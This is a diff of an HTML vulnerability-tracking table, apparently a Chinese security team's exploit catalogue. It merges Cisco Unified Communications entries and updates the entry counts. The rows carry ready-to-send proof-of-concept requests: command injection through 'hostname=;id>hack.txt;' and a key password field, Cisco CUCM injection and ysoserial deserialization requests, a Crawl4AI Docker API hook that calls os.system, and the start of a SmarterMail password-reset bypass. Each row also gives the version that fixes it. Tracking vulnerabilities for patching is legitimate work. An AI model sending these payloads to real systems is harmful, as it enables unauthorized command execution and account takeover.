@@ -333,10 +333,10 @@ td .tag {
 <option value="8">标签</option>
 <option value="9">验真人</option>
 </select>
-<span class="stat-badge total">共 142 条</span>
+<span class="stat-badge total">共 141 条</span>
 <span class="stat-badge zday">0day 12</span>
 <span class="stat-badge oney">1day 9</span>
-<span class="stat-badge nday">nday 121</span>
+<span class="stat-badge nday">nday 120</span>
 </div>
 <div class="table-wrap">
 <table id="vulnTable">
@@ -583,10 +583,12 @@ protocol=ssh&amp;keyPath=/etc/passwd&amp;keypassword=123&#x27;;id&gt;hack.txt;&#
 
 POST /isomp-protocol/protocol/session HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
 
-protocol=x11&amp;port=11&amp;hostname=;id&gt;hack.txt;&amp;resolution=1*1</td><td class="cell-hover" onclick="copyCell(this)">升级至 3.0.12 20241106+</td><td>20260122</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Cisco</span></td><td class="cell-hover" onclick="copyCell(this)">Cisco Unified CM 漏洞被主动利用</td><td><span class="tag">代码注入</span></td><td class="cell-hover" onclick="copyCell(this)">12.5/14.x</td><td class="cell-hover" onclick="copyCell(this)">/cucm-uds/</td><td class="cell-hover" onclick="copyCell(this)">&#x27;;id#
-https://github.com/dkstar11q/Ashwesker-CVE-2026-20045</td><td class="cell-hover" onclick="copyCell(this)">安装官方补丁</td><td>20260121</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">cisco</span></td><td class="cell-hover" onclick="copyCell(this)">Cisco Unified Communications 多产品代码注入漏洞</td><td><span class="tag">代码注入</span></td><td class="cell-hover" onclick="copyCell(this)">12.6</td><td class="cell-hover" onclick="copyCell(this)">/vmrest/</td><td class="cell-hover" onclick="copyCell(this)">POST /vmrest/ HTTP/1.1 Host: target &lt;ysoserial payload&gt;
+protocol=x11&amp;port=11&amp;hostname=;id&gt;hack.txt;&amp;resolution=1*1</td><td class="cell-hover" onclick="copyCell(this)">升级至 3.0.12 20241106+</td><td>20260122</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Cisco</span></td><td class="cell-hover" onclick="copyCell(this)">Cisco Unified Communications 多产品代码注入漏洞</td><td><span class="tag">代码注入</span></td><td class="cell-hover" onclick="copyCell(this)">12.5/14.x / 12.6</td><td class="cell-hover" onclick="copyCell(this)">/cucm-uds/ /vmrest/ /cucemapi/ /ccm100/</td><td class="cell-hover" onclick="copyCell(this)">POST /cucm-uds/ HTTP/1.1 Host: target &#x27;;id#
+POST /vmrest/ HTTP/1.1 Host: target &lt;ysoserial payload&gt;
 POST /cucemapi/ HTTP/1.1 Host: target &lt;ysoserial payload&gt;
-POST /ccm100/ HTTP/1.1 Host: target &lt;ysoserial payload&gt;</td><td class="cell-hover" onclick="copyCell(this)">升级至 15SU2 / 12.6(2)ES04</td><td>20260121</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Crawl4AI</span></td><td class="cell-hover" onclick="copyCell(this)">Crawl4AI Docker API 远程代码执行漏洞</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">0.8.0</td><td class="cell-hover" onclick="copyCell(this)">/crawl</td><td class="cell-hover" onclick="copyCell(this)">POST /crawl HTTP/1.1 Host: target Content-Type: application/json
+POST /ccm100/ HTTP/1.1 Host: target &lt;ysoserial payload&gt;
+
+https://github.com/dkstar11q/Ashwesker-CVE-2026-20045</td><td class="cell-hover" onclick="copyCell(this)">升级至 15SU2 / 12.6(2)ES04；安装官方补丁</td><td>20260121</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Crawl4AI</span></td><td class="cell-hover" onclick="copyCell(this)">Crawl4AI Docker API 远程代码执行漏洞</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">0.8.0</td><td class="cell-hover" onclick="copyCell(this)">/crawl</td><td class="cell-hover" onclick="copyCell(this)">POST /crawl HTTP/1.1 Host: target Content-Type: application/json
 
 {&quot;urls&quot;: [&quot;&quot;], &quot;hooks&quot;: {&quot;code&quot;: {&quot;on_page_context_created&quot;: &quot;async def hook(page, context, **kwargs): __import__(&#x27;os&#x27;).system(&#x27;id&#x27;); return page&quot;}}}</td><td class="cell-hover" onclick="copyCell(this)">升级至 0.8.0+</td><td>20260116</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">SmarterTools</span></td><td class="cell-hover" onclick="copyCell(this)">SmarterMail 密码重置接口认证绕过漏洞</td><td><span class="tag">认证绕过</span></td><td class="cell-hover" onclick="copyCell(this)">Build &lt; 9511</td><td class="cell-hover" onclick="copyCell(this)">/api/v1/auth/force-reset-password</td><td class="cell-hover" onclick="copyCell(this)">POST /api/v1/auth/force-reset-password HTTP/1.1 Host: target:9998 Content-Type: application/json
 
